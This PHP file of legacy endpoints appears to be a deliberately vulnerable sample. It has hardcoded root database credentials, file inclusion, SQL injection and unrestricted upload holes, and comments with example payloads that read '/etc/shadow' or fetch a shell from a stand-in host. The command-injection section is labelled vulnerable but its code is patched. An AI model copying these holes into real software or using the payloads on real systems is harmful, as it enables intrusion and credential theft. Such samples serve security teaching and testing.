<?php
// Legacy endpoints kept alive for the old dashboard.

// Hardcoded DB credentials committed to source control
$conn = mysqli_connect("db.internal", "root", "root123", "app");

// VULN 1: Local/Remote File Inclusion — user input passed to include().
// ?page=../../../../etc/passwd  or  ?page=http://evil/shell.txt
$page = $_GET['page'];
include($page);

// VULN 2: SQL Injection — request value concatenated into the query.
// ?id=1 OR 1=1 --
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT name, email FROM users WHERE id = $id");
while ($row = mysqli_fetch_assoc($result)) {
    echo $row['name'] . " (" . $row['email'] . ")\n";
}

// VULN 3: OS Command Injection — user input passed to a shell.
// ?host=8.8.8.8; cat /etc/shadow
$host = $_GET['host'];
// Only allow valid hostnames or IP addresses, then escape the argument
// before passing it to the shell to prevent OS command injection.
if (filter_var($host, FILTER_VALIDATE_IP) === false
    && !preg_match('/^[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*$/', (string) $host)) {
    http_response_code(400);
    echo "Invalid host";
    exit;
}
system("ping -c 1 " . escapeshellarg($host));

// VULN 4: Unrestricted File Upload — the uploaded file is moved into the
// webroot keeping its original name/extension, allowing a .php webshell.
if (isset($_FILES['upload'])) {
    $target = "/var/www/html/uploads/" . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "uploaded to " . $target;
}
?>
